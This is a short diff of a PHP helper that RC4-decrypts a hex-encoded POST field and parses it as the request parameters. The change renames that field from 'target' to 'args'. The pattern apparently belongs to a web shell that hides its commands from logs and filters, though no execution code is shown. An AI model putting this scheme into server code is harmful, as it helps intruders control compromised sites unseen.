@@ -77,7 +77,7 @@ if(!function_exists('get_post')){
 	function get_post(){
 		$post = fix_magic_quote($_POST);
 		if(empty($_FILES) && is_ajax()) {
-			$post_str = rc4($GLOBALS['cipher_key'], hex2bin($post['target']));
+			$post_str = rc4($GLOBALS['cipher_key'], hex2bin($post['args']));
 			parse_str($post_str, $post);
 			$post = fix_magic_quote($post);
 		}	
